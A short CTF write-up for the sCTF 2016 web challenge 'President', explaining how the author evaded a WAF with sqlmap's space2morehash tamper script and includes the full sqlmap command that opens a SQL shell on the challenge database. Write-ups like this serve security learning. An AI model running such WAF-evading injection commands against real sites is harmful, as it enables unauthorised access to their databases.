---
layout: post
title: "sCTF Q1 2016 - President"
category: writeups
author: phosphore
tags: web sctf-2016
---

## President
Web - 40 Points

I just created a site with a list of popular presidential candidates!

### Writeup
After some trying with sqlmap, we found out that there was some sort of WAF/IPS.
This tampering script ([space2morehash.py](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/space2morehash.py)) was useful to find a valid injection point.
It replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n'). Take note that the minimum version required for it to work is MySQL >= 5.1.13.

{% highlight bash %}
./sqlmap.py --dbms "MySQL" --technique U --batch --tamper "space2morehash.py" -r /tmp/president.sctf.michaelz.xyz.har -D sctf_injection --exclude-sysdbs --sql-shell
{% endhighlight %}

Bingo!


![Our injection]({{ site.url }}/assets/president_inj.png){: .center-image }




